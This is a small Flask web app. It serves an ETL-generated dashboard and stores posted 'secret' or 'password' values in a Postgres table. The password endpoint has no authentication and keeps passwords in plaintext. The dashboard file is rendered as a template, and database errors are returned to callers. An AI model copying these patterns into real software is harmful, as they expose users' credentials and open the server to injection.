import os
import glob
from flask import Flask, render_template_string, request, jsonify
import psycopg2

app = Flask(__name__)

DB_HOST = "YOUR_HOST"
DB_NAME = "postgres"
DB_USER = "postgres"
DB_PASS = "YOUR_PASSWORD"


def get_latest_dashboard_html():
    search_path = os.path.join(os.getcwd(), "output", "*", "dashboard.html")
    files = glob.glob(search_path)

    if not files:
        return """
            <div style='text-align:center; padding:50px; font-family:sans-serif;'>
                <h1>⚠️ No Dashboard Found</h1>
                <p>Please run the ETL script first to generate the output.</p>
            </div>
            """

    latest_file = max(files, key=os.path.getctime)

    print(f"--> Sirviendo dashboard desde: {latest_file}")

    with open(latest_file, 'r', encoding='utf-8') as f:
        return f.read()


@app.route('/')
def home():
    return render_template_string(get_latest_dashboard_html())

@app.route('/add_data', methods=['POST'])
@app.route('/api/save-password', methods=['POST'])
def add_data():
    data = request.json
    secret = data.get('secret') or data.get('password')

    if not secret:
        return jsonify({"status": "error", "msg": "Empty data"}), 400

    try:
        conn = psycopg2.connect(
            host=DB_HOST,
            dbname=DB_NAME,
            user=DB_USER,
            password=DB_PASS,
            connect_timeout=3
        )
        cur = conn.cursor()

        cur.execute(
            "CREATE TABLE IF NOT EXISTS secrets (id SERIAL PRIMARY KEY, content TEXT, timestamp TIMESTAMP DEFAULT NOW());")

        cur.execute("INSERT INTO secrets (content) VALUES (%s)", (secret,))

        conn.commit()
        cur.close()
        conn.close()

        return jsonify({"status": "success"}), 200

    except Exception as e:
        print(f"ERROR DB: {e}")
        return jsonify({"status": "error", "msg": str(e)}), 500

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=80)